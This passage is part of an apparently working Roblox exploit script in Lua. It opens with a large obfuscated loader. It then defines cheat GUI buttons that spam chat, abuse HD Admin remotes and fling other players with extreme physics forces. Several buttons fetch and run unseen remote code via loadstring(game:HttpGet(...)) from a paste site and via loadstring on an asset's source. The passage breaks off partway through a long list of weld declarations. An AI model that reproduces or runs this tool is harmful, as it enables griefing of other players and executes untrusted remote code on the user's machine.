111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mj2")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("rKmx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mh6")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("JYzL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("VB")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("QOR")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lm")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("gzr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4Q")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{593;946;686;533};"1 + 1 = 111";{264;448;679;780};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("m5QC")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("G5")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("tgD")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NP")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("BLn")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gS")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("bh9")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("me")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("Ngd")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("xNg")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{812;263;10;867};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("b4")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("2G3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hi")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{662;253;171;857};{360;226;735;870};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("7vrK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eu")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("0KU")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("F5")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("gTI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dj")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Qpl")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("s9fW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("SP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{680;614;901;21};{695;664;234;679};{382;44;967;108};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("l2Bc")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Di")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PU8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("OrJT")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uWQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("iBeu")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qL")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sde")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Qlzr")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Lz")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("mBS")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("5xf")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4l9T")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("gK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("yd0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5sMK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7X")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("IIZ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("JSMR")];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("Kz4X3P58LsGostTVfboh1iOq6WR4RS2rGXU3ezdkX39oPilthnld5aZCVN0h7ar2BnTFK0RR7du8izMYKxWDGY")then ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Cef")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QC")]];else local ajefa_IlIIllIIIl;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("si")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Nux")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tEOI")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vO")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fPG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("29Sm")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{958;424;574;776};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Hq6k")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("iJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{919;29;202;404};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gLX5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("HZf")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("x0")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4Ck")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{45;517;813;749};{570;317;180;901};{601;693;940;987};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lE")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3eC")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vP8J")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QZ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("7J0")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("AYyL")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("jv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("8mk")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{218;435;207;494};{496;803;936;743};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7V")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("dIq")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("5EWi")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("G7siBJ6nWLgYBAQUrHFg1Q1tvbbHKoZxM2nHqSqia0IybKkz4MF5aSE0g9WzHANIVUmJmjEKqxfbhErW0NN8T4v4")then if not ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("bX")]]then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0cH")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll>#("yAr61MLm9MryMlUi5PONCSNRaI3WPY1yrkZTlOAVEYh1ayoB2ZYpSq5PXK5sTYIlV3fBxb7qp3iOKWRMtC4Z9MQap")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("4u")];local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("AXp")]];ajefa_lIlllIll[ajefa_lIIllIlIIlllII+1]=ajefa_IlIIIlIllIlIlllIlIlIllll;ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIIlIllIlIlllIlIlIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OvCE")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("f5")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oJK")];end;ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;end;end);end;return ajefa_lIIIllIlIIIIIllIlII(true,{},ajefa_lIlIllIlIlIlIIIlIllIllI())();end)(string.byte,table.insert,setmetatable);

end)
Section7:NewButton("z-b-e hats code 2", "4047554959,4584029953,3443038622,3656493304,3940375351,3033908130,4154538250", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("z-b-e hats code 3", "3940375351,3033908130,4154538250", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("coming soon!", "coming soon!", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("coming soon!", "coming soon!", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("coming soon!", "coming soon!", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("coming soon!", "coming soon!", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
Section7:NewButton("coming soon!", "coming soon!", function()
            local args = {
    [1] = "coming soon!",
    [2] = "All"
}
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
end)
local Section8 = ScriptFETab:NewSection("Script FE : hats & no hats")

Section8:NewButton("r6", "needs admin!", function()
        local A_1 = ";morph me don"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section8:NewButton("refresh", "needs admin!", function()
        local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
end)
Section8:NewButton("Cobra human real *if dosen't work respawn", "need r6! hat : 5411702474 +respawn", function()
     local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
     local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(1)
     local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(2)
     local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(3)
     local A_1 = ";color me black"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(4)
     local A_1 = ";hat me 5411702474"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(5)
loadstring(game:HttpGet(('https://pastefy.ga/tWBTcE4R/raw'),true))()
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section8:NewButton("Cobra human your skin", " needed r6!", function()
         local A_1 = ";refresh"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(2)
loadstring(game:HttpGet(('https://pastefy.ga/tWBTcE4R/raw'),true))()
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "script done!";
        Text = "you can now use it";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section8:NewButton("Sword V hat! free coming soon broke", "7548993875,r6", function()
         local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
         local A_1 = ";hat me 7548993875"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
     game:GetService("StarterGui"):SetCore("SendNotification", { 
        Title = "failed:(";
        Text = "the script it seems is locked";
        Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
    Duration = 16;
end)
Section8:NewButton("Sword V hat paid!", "4506945409,r6", function()
         local A_1 = ";morph me donald"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.1)
         local A_1 = ";morph me noob1"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.3)
         local A_1 = ";char"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.5)
         local A_1 = ";char me 4034224714"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.7)
         local A_1 = ";hat me 4506945409"
local Event = game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand
Event:InvokeServer(A_1)
 wait(0.9)
    




Bypass = "death"
loadstring(game:GetObjects("rbxassetid://5325226148")[1].Source)()
-----OPTIONS
local ToolName = "MeshPartAccessory"
local NoSound = true 
local OldModel = false 

local IsDead = false
local StateMover = true


for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
game:GetService("RunService").Heartbeat:connect(function()
v.Velocity = Vector3.new(-30,0,0)
end)
end
end

local playerss = workspace.non
local maybe = playerss[ToolName].Handle
local bbv,bullet
if Bypass == "death" then
	bullet = game.Players.LocalPlayer.Character["HumanoidRootPart"]
	bullet.Transparency = 0
	bullet.Massless = true
	if bullet:FindFirstChildOfClass("Attachment") then
		for _,v in pairs(bullet:GetChildren()) do
			if v:IsA("Attachment") then
				
			end
		end
	end

	bbv = Instance.new("BodyPosition",bullet)
    bbv.Position = playerss.Torso.CFrame.p
end

if maybe:FindFirstChild("AccessoryWeld") then maybe:FindFirstChild("AccessoryWeld"):Destroy() end
if game.Players.LocalPlayer.Character[ToolName].Handle:FindFirstChild("AccessoryWeld") then game.Players.LocalPlayer.Character[ToolName].Handle:FindFirstChild("AccessoryWeld"):Destroy() end


maybe:FindFirstChildOfClass("AlignPosition").Name = "AlignPosition2"
maybe:FindFirstChildOfClass("AlignOrientation").Name = "AlignOrientation2"

playerss.Torso.WaistBackAttachment.Position = Vector3.new(-0, -0, 0.6)
playerss.Torso.WaistBackAttachment.Orientation = Vector3.new(-4.16, -179.28, 99.8)

if Bypass == "death" then
coroutine.wrap(function()
	while true do
		if not playerss or not playerss:FindFirstChildOfClass("Humanoid") or playerss:FindFirstChildOfClass("Humanoid").Health <= 0 then IsDead = true; return end
		if StateMover then
			bbv.Position = playerss.Torso.CFrame.p
    		bullet.Position = playerss.Torso.CFrame.p
		end
		game:GetService("RunService").RenderStepped:wait()
	end
end)()
end

local CDDF = {}
local DamageFling = function(DmgPer)
	if IsDead or Bypass ~= "death" or (DmgPer.Name == playerss.Name and DmgPer.Name == "non") or CDDF[DmgPer] or not DmgPer or not DmgPer:FindFirstChildOfClass("Humanoid") or DmgPer:FindFirstChildOfClass("Humanoid").Health <= 0 then return end
	CDDF[DmgPer] = true; StateMover = false
	local PosFling = (DmgPer:FindFirstChild("HumanoidRootPart") and DmgPer:FindFirstChild("HumanoidRootPart") .CFrame.p) or (DmgPer:FindFirstChildOfClass("Part") and DmgPer:FindFirstChildOfClass("Part").CFrame.p)
    bbav = Instance.new("BodyAngularVelocity",bullet)
    bbav.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
    bbav.P = 1000000000000000000000000000
    bbav.AngularVelocity = Vector3.new(10000000000000000000000000000000,100000000000000000000000000,100000000000000000)
    game:GetService("Debris"):AddItem(bbav,0.1)
    bullet.Rotation = playerss.Torso.Rotation
	for _=1,15 do
		bbv.Position = PosFling
		bullet.Position = PosFling
		wait(0.03)
	end
	bbv.Position = playerss.Torso.CFrame.p
    bullet.Position = playerss.Torso.CFrame.p
	CDDF[DmgPer] = false; StateMover = true
end

cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
Model0 = Instance.new("Model")
Part1 = Instance.new("Part")
SpecialMesh2 = Instance.new("SpecialMesh")
Part3 = Instance.new("Part")
SpecialMesh4 = Instance.new("SpecialMesh")
Weld5 = Instance.new("Weld")
Weld6 = Instance.new("Weld")
Weld7 = Instance.new("Weld")
Weld8 = Instance.new("Weld")
Weld9 = Instance.new("Weld")
Weld10 = Instance.new("Weld")
Weld11 = Instance.new("Weld")
Weld12 = Instance.new("Weld")
Weld13 = Instance.new("Weld")
Weld14 = Instance.new("Weld")
Weld15 = Instance.new("Weld")
Weld16 = Instance.new("Weld")
Weld17 = Instance.new("Weld")
Weld18 = Instance.new("Weld")
Weld19 = Instance.new("Weld")
Weld20 = Instance.new("Weld")
Weld21 = Instance.new("Weld")
Weld22 = Instance.new("Weld")
Weld23 = Instance.new("Weld")
Weld24 = Instance.new("Weld")
Weld25 = Instance.new("Weld")
Weld26 = Instance.new("Weld")
Weld27 = Instance.new("Weld")
Weld28 = Instance.new("Weld")
Weld29 = Instance.new("Weld")
Weld30 = Instance.new("Weld")
Weld31 = Instance.new("Weld")
Weld32 = Instance.new("Weld")
Weld33 = Instance.new("Weld")
Weld34 = Instance.new("Weld")
Weld35 = Instance.new("Weld")
Weld36 = Instance.new("Weld")
Weld37 = Instance.new("Weld")
Weld38 = Instance.new("Weld")
Weld39 = Instance.new("Weld")
Weld40 = Instance.new("Weld")
Weld41 = Instance.new("Weld")
Weld42 = Instance.new("Weld")
Weld43 = Instance.new("Weld")
Weld44 = Instance.new("Weld")
Weld45 = Instance.new("Weld")
Weld46 = Instance.new("Weld")
Weld47 = Instance.new("Weld")
Weld48 = Instance.new("Weld")
Weld49 = Instance.new("Weld")
Weld50 = Instance.new("Weld")
Weld51 = Instance.new("Weld")
Weld52 = Instance.new("Weld")
Weld53 = Instance.new("Weld")
Weld54 = Instance.new("Weld")
Weld55 = Instance.new("Weld")
Weld56 = Instance.new("Weld")
Weld57 = Instance.new("Weld")
Weld58 = Instance.new("Weld")
Weld59 = Instance.new("Weld")
Weld60 = Instance.new("Weld")
Weld61 = Instance.new("Weld")
Weld62 = Instance.new("Weld")
Weld63 = Instance.new("Weld")
Weld64 = Instance.new("Weld")
Weld65 = Instance.new("Weld")
Weld66 = Instance.new("Weld")
Weld67 = Instance.new("Weld")
Weld68 = Instance.new("Weld")
Weld69 = Instance.new("Weld")
Weld70 = Instance.new("Weld")
Weld71 = Instance.new("Weld")
Weld72 = Instance.new("Weld")
Weld73 = Instance.new("Weld")
Weld74 = Instance.new("Weld")
Weld75 = Instance.new("Weld")
Weld76 = Instance.new("Weld")
Weld77 = Instance.new("Weld")
Weld78 = Instance.new("Weld")
Weld79 = Instance.new("Weld")
Weld80 = Instance.new("Weld")
Weld81 = Instance.new("Weld")
Weld82 = Instance.new("Weld")
